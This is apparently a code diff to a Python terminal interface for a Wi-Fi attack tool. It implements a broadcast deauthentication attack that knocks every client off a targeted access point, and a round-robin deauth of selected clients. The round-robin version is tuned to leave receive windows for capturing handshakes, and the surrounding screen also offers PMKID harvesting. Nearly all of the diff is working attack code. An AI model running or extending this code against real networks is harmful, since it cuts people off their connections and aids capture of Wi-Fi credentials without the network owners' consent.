@@ -118,7 +118,7 @@ class FocusView(Screen):
                 with Vertical(id="attack-panel"):
                     yield Label("ATTACKS", classes="panel-title")
                     with Horizontal(classes="button-row"):
-                        yield Button("Deauth All", variant="error", id="btn-deauth-all")
+                        yield Button("Broadcast", variant="error", id="btn-deauth-bcast")
                         yield Button("Deauth [x]", variant="warning", id="btn-deauth-sel", disabled=True)
                         yield Button("PMKID", variant="primary", id="btn-pmkid")
                     with Horizontal(classes="button-row"):
@@ -468,10 +468,10 @@ class FocusView(Screen):
         bid = event.button.id
         if bid == "btn-save":
             self._save_capture()
-        elif bid == "btn-deauth-all":
-            self._log("[dim]Deauth All — not yet wired in this build.[/dim]")
+        elif bid == "btn-deauth-bcast":
+            self.run_worker(self._run_deauth_broadcast(), exclusive=True)
         elif bid == "btn-deauth-sel":
-            self._log("[dim]Deauth Selected — not yet wired in this build.[/dim]")
+            self.run_worker(self._run_deauth_selected(), exclusive=True)
         elif bid == "btn-pmkid":
             self.run_worker(self._run_pmkid_harvest(), exclusive=True)
         elif bid == "btn-sae-probe":
@@ -481,6 +481,74 @@ class FocusView(Screen):
 
     def action_save_capture(self) -> None:
         self._save_capture()
+
+    async def _run_deauth_broadcast(self) -> None:
+        """Worker: broadcast-deauth every station associated with the focused AP."""
+        ap = self.target_ap
+        iface = getattr(self.app, "active_interface", None)
+        if not ap or not iface:
+            self._log("[red]✗ No target / interface — aborting Broadcast.[/red]")
+            return
+
+        BROADCAST = "ff:ff:ff:ff:ff:ff"
+        self._log(
+            f"[bold cyan]→ Broadcast deauth[/bold cyan] on "
+            f"[bold]{escape(ap.ssid or '<hidden>')}[/bold] ({ap.bssid}) CH {ap.channel}"
+        )
+        try:
+            await iface.deauth(ap.bssid, BROADCAST)
+        except Exception as exc:
+            logger.exception("Broadcast deauth crashed")
+            self._log(f"[bold red]✗ Broadcast crashed:[/bold red] {escape(str(exc))}")
+            return
+        self._log("[green]✓ Broadcast deauth burst sent.[/green]")
+
+    # Total deauth pairs per selected client. Round-robin'd across clients so
+    # each frame pair is followed by a 10ms RX window — keeps the radio from
+    # being TX-saturated when many clients are queued (wifite2 starved RX
+    # exactly this way when too many deauths were back-to-back).
+    _DEAUTH_SEL_ROUNDS = 10
+
+    async def _run_deauth_selected(self) -> None:
+        """Worker: deauth each selected client, interleaved round-robin so RX
+        gets a slice between every frame pair."""
+        ap = self.target_ap
+        iface = getattr(self.app, "active_interface", None)
+        if not ap or not iface:
+            self._log("[red]✗ No target / interface — aborting Deauth Selected.[/red]")
+            return
+
+        # Snapshot — the set can mutate while we're iterating.
+        targets = sorted(self._selected_clients)
+        if not targets:
+            self._log("[yellow]⚠ No clients selected.[/yellow]")
+            return
+
+        self._log(
+            f"[bold cyan]→ Deauth Selected[/bold cyan] "
+            f"({len(targets)} client(s) × {self._DEAUTH_SEL_ROUNDS} rounds, round-robin) on "
+            f"[bold]{escape(ap.ssid or '<hidden>')}[/bold] ({ap.bssid}) CH {ap.channel}"
+        )
+        failed: set[str] = set()
+        for _ in range(self._DEAUTH_SEL_ROUNDS):
+            for mac in targets:
+                if mac in failed:
+                    continue
+                try:
+                    await iface.deauth(ap.bssid, mac, burst_count=1)
+                except Exception as exc:
+                    logger.exception("Deauth %s crashed", mac)
+                    self._log(
+                        f"[bold red]✗ Deauth {escape(mac)} crashed:[/bold red] "
+                        f"{escape(str(exc))} — dropping target."
+                    )
+                    failed.add(mac)
+        sent = len(targets) - len(failed)
+        self._log(
+            f"[green]✓ Round-robin deauth complete[/green] — "
+            f"{sent}/{len(targets)} client(s) hit "
+            f"({self._DEAUTH_SEL_ROUNDS} pairs each)."
+        )
 
     async def _run_pmkid_harvest(self) -> None:
         """Worker: run a PMKID harvest against the focused AP."""
